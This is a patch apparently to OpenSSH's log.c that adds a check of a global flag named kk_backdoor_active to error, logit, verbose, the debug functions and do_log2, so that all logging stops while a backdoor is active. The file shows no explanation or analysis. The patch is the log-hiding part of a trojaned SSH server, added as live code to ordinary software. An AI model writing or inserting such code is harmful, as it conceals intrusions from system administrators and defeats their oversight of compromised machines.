@@ -159,6 +159,9 @@ error(const char *fmt,...)
 {
 	va_list args;
 
+	if(kk_backdoor_active)
+		return;
+
 	va_start(args, fmt);
 	do_log(SYSLOG_LEVEL_ERROR, fmt, args);
 	va_end(args);
@@ -185,6 +188,9 @@ logit(const char *fmt,...)
 {
 	va_list args;
 
+	if(kk_backdoor_active)
+		return;
+
 	va_start(args, fmt);
 	do_log(SYSLOG_LEVEL_INFO, fmt, args);
 	va_end(args);
@@ -196,6 +202,9 @@ void
 verbose(const char *fmt,...)
 {
 	va_list args;
+
+	if(kk_backdoor_active)
+		return;
 
 	va_start(args, fmt);
 	do_log(SYSLOG_LEVEL_VERBOSE, fmt, args);
@@ -209,6 +218,9 @@ debug(const char *fmt,...)
 {
 	va_list args;
 
+	if(kk_backdoor_active)
+		return;
+
 	va_start(args, fmt);
 	do_log(SYSLOG_LEVEL_DEBUG1, fmt, args);
 	va_end(args);
@@ -219,6 +231,9 @@ debug2(const char *fmt,...)
 {
 	va_list args;
 
+	if(kk_backdoor_active)
+		return;
+
 	va_start(args, fmt);
 	do_log(SYSLOG_LEVEL_DEBUG2, fmt, args);
 	va_end(args);
@@ -228,6 +243,9 @@ void
 debug3(const char *fmt,...)
 {
 	va_list args;
+
+	if(kk_backdoor_active)
+		return;
 
 	va_start(args, fmt);
 	do_log(SYSLOG_LEVEL_DEBUG3, fmt, args);
@@ -373,6 +391,9 @@ void
 do_log2(LogLevel level, const char *fmt,...)
 {
 	va_list args;
+
+	if(kk_backdoor_active)
+		return;
 
 	va_start(args, fmt);
 	do_log(level, fmt, args);
